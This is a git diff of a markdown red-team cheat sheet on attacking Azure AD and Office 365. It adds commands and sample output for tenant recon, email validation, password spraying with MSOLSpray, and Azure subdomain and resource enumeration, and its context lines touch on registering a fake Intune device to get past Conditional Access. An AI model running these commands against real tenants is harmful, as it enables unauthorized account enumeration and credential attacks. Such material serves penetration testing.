@@ -1,14 +1,5 @@
 # Azure AD Enumerate
 
-## OSINT AAD - Recon Domains
-
-Extract openly available information for the given tenant: [aadinternals.com/osint](https://aadinternals.com/osint/)
-
-```ps1
-Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
-Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
-```
-
 ## Azure AD - Collectors
 
 * roadrecon
@@ -23,7 +14,93 @@ Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
     ```
 
 
-## Azure AD - Conditional Access Policy
+## Azure AD - User Enumeration
+
+### Enumerate Tenant Informations
+
+* Federation with Azure AD or O365
+    ```powershell
+    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
+    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
+    ```
+* Get the Tenant ID
+    ```powershell
+    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
+    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
+    ```
+
+
+### Enumerate Email
+
+> By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.
+
+* Validate email 
+    ```powershell
+    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
+    admin@<TENANT NAME>.onmicrosoft.com   - VALID
+    root@<TENANT NAME>.onmicrosoft.com    - INVALID
+    test@<TENANT NAME>.onmicrosoft.com    - VALID
+    contact@<TENANT NAME>.onmicrosoft.com - INVALID
+    ```
+* Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon
+
+
+### Password Spraying
+
+```powershell
+PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
+PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
+```
+
+
+## Azure Services Enumeration
+
+### Enumerate Tenant Domains
+
+Extract openly available information for the given tenant: [aadinternals.com/osint](https://aadinternals.com/osint/)
+
+```ps1
+Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
+Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
+```
+
+
+### Enumerate Azure Subdomains
+
+```powershell
+PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
+PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
+Subdomain Service
+--------- -------
+<TENANT NAME>.mail.protection.outlook.com Email
+<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
+```
+
+### Enumerate Services
+
+* Using Az Powershell module
+    ```powershell
+    PS Az> Get-AzResource
+    PS Az> Get-AzVM | fl
+    PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
+    PS Az> Get-AzFunctionApp
+    PS Az> Get-AzStorageAccount | fl
+    PS Az> Get-AzKeyVault
+    PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com
+    ```
+
+* Using az cli
+    ```powershell
+    PS> az vm list
+    PS> az vm list --query "[].[name]" -o table
+    PS> az webapp list
+    PS> az functionapp list --query "[].[name]" -o table
+    PS> az storage account list
+    PS> az keyvault list
+    ```
+
+
+## Conditional Access Policy
 
 Conditional Access is used to restrict access to resources to compliant devices only.
 
@@ -59,7 +136,8 @@ Join-AADIntDeviceToIntune -DeviceName "SixByFour"
 Start-AADIntDeviceIntuneCallback -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName "SixByFour"
 ```
 
-## Azure AD - MFA
+
+## Multi Factor Authentication
 
 * [dafthack/MFASweep](https://github.com/dafthack/MFASweep) - A tool for checking if MFA is enabled on multiple Microsoft Services
 ```ps1
